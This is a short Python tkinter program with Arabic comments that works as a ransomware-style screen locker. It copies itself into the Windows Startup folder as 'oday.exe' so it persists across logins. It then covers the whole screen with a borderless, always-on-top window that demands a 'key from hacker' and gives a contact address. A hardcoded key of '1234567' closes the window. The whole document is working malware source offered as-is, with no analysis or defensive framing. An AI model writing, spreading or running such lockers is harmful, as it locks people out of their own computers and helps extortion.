import tkinter as tk
from tkinter import messagebox
import os
import sys
import shutil
import threading


# تحديد مسار التطبيق
path_app = os.path.abspath(sys.argv[0])

# تحديد مجلد البداية في قائمة "ابدأ"
run_start = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
name = os.path.join(run_start, "oday.exe")

# إذا لم يكن التطبيق موجودًا في المجلد، قم بنسخه
if not os.path.exists(name):
    shutil.copy(path_app, name)

# دالة للخروج من التطبيق
def exit_app():
    root.destroy()

# دالة للتحقق من المفتاح المدخل
def clos(event=None):
    key = "1234567"
    if entry.get() == key:
        exit_app()
    else:
        messagebox.showerror("Don't play with me", "The key is wrong")

# إعداد واجهة المستخدم
root = tk.Tk()

# إخفاء إطار النافذة
root.overrideredirect(True)
root.attributes("-topmost", True)

# إضافة النصوص والعناصر
tk.Label(root, text="Enter the key from hacker:", bg="green", fg="black").pack()

entry = tk.Entry(root, width=50, border=0)
entry.pack(pady=20)

b = tk.Button(root, text="Submit", command=clos)
b.pack()

root.config(background="green")
root.resizable(False, False)

# جعل نافذة التطبيق تغطي الشاشة بالكامل
root.geometry(f"{root.winfo_screenwidth()}x{root.winfo_screenheight()}+0+0")
root.title("Keno")

tk.Label(root, text="hack@gmail.com", bg="green", fg="black").pack(pady=20)

# استدعاء الدالة clos عند الضغط على Enter أو الزر Submit
entry.bind("<Return>", clos)

# تشغيل نافذة tkinter
root.mainloop()
